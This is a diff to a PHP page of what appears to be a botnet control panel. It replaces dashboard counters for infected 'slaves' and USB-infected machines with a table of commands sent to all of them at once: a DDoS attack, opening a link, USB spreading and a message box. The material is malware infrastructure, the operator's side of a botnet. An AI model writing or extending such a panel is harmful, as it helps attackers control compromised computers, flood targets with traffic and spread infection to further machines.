@@ -31,7 +31,7 @@ exit();
 </head>
 <body>
 <div id="navbar">
-<img src="images/mustafa.jpg" width="60" class="image">
+<img src="images/mustafa.jpg" width="50" class="image">
 <a class="username"><? echo($usernamec) ?></a>
 <br><br><br>
 <div id="navbar-menu">
@@ -54,45 +54,35 @@ exit();
 <hr class="navbar-hr" color="#3ab4a6">
 </div>
 </div>
-<div id="greenbox">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxtwo">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='Y'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxthree">
-<?
-$get_slaves = mysql_query("SELECT * FROM slaves WHERE usb='true'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>USB SLAVES</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<div id="greenboxthree">
-<?
-$get_slaves = mysql_query("SELECT * FROM commands WHERE status='pending'", $connect);
-$slaves_number = mysql_num_rows($get_slaves);
-?>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'>COMMANDS</font>
-<br><br>
-<font size="7" style='font-family : "Helvetica Neue",Helvetica,Arial,sans-serif;'><? echo $slaves_number ?></font>
-</div>
-<center>
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-<font size="30" color="#FF0000" face="Lobster">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mustafa Riadh Ketab</font>
-</center>
+<div class="datagrid">
+<table width="80%" style="position : absolute; left : 250px;" border="1">
+<thead><tr><th>COMMAND</th><th>DESCRIPTION</th></thead>
+<tbody>
+<tr><td>DDOS ATTACK</td><td>PERFORM DDOS ATTACK FOR ALL SLAVES</td><td>
+<form action="../commands/send_command.php" method="get">
+<input type="hidden" name="action" value="ddos">
+<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
+</form>
+</td></tr>
+<tr><td>VISIT LINK</td><td>OPEN LINK FOR ALL SLAVES</td><td>
+<form action="../commands/send_command.php" method="get">
+<input type="hidden" name="action" value="visitlink">
+<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
+</form>
+</td></tr>
+<tr><td>START SPREADING</td><td>USB SPREADING</td><td>
+<form action="../commands/send_command.php" method="get">
+<input type="hidden" name="action" value="spreading">
+<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
+</form>
+</td></tr>
+<tr><td>MESSAGE BOX</td><td>SEND MESSAGE BOX</td><td>
+<form action="../commands/send_command.php" method="get">
+<input type="hidden" name="action" value="msgbox">
+<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
+</form>
+</td></tr>
+</tbody>
+</table></div>
 </body>
 </html>
